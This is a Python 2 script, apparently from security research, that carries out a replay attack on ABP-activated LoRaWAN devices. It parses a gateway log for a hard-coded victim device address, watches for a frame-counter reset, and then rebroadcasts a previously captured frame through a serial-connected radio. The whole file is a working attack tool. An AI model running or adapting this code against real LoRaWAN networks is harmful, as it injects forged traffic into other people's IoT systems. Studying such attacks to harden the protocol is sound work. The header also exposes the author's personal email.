# Author: Xueying Yang
# EMail: yangxueying0910@hotmail.com
# This program is to achieve replay attack for ABP activated LoRaWAN end-devices
# coding=utf-8
import time
import binascii
import base64
import serial


class ReplayAttack(object):

    def readLog(self,label,file):
        file.seek(label,0)
        info = file.read()
        info = info.split('\n')
        label = file.tell()
        return info,label

    def outputCTR(self):

        label = 0
        m = 0
        payload_g = []
        ctr_g = []
        devaddr_g = []
        ctr_reset = []
        victim_dev = '89140126'
        while 1:
            m += 1
            print time.asctime()
            path = "/home/xueying/PycharmProjects/cribdragging/test_attack2.txt"
            file = open(path, "r")
            info,label = ReplayAttack().readLog(label,file)
            for i in range(len(info)):
                if 'rxInfo' in info[i]:
                    phy_index = info[i].index('phyPayload')
                    phy = info[i][phy_index + 13:-2]
                    phy_hex = binascii.hexlify(base64.decodestring(phy))
                    ctr = phy_hex[12:16]
                    ctr = int(ctr[2:] + ctr[:2], 16)
                    devaddr = phy_hex[2:10]
                    print 'DevAddr', devaddr, ', Counter number is', ctr, ', Physical Payload is', phy_hex
                    if devaddr == victim_dev and m != 1 :
                        payload_g.append(phy_hex)
                        ctr_g.append(ctr)
                        devaddr_g.append(devaddr)
                        if len(payload_g) >= 2:
                            if ctr <= ctr_g[-2] and ctr_g[-2] not in ctr_reset:
                                print 'Here is a reset!'
                                print ctr_g
                                ReplayAttack().serialSettings(payload_g[-2])
                                ctr_reset.append(ctr_g[-2])
                                print ctr_reset
            time.sleep(30)

    # configure the serial connections (the parameters differs on the device you are connecting to)
    def serialSettings(self,phy_hex):
        ser = serial.Serial(
            port='/dev/ttyACM2',
            baudrate=57600,
            parity=serial.PARITY_NONE,
            stopbits=serial.STOPBITS_ONE,
            bytesize=serial.EIGHTBITS
        )
        ser.isOpen()

        input = phy_hex
        ser.write('sys reset\r\n')
        out_reset = ''
        time.sleep(1)
        while ser.inWaiting() > 0:
            out_reset += ser.read(1)
        if out_reset != '':
            print ">>" + out_reset
        time.sleep(1)
        ser.write('radio tx ' + input +'\r\n')
        print 'radio tx ' + input +'\r\n'
        out = ''
        time.sleep(1)
        while ser.inWaiting() > 0:
            out += ser.read(1)
        if out != '':
            print ">>" + out
            print "Attacking......"
        ser.close()
        # exit()


ReplayAttack().outputCTR()
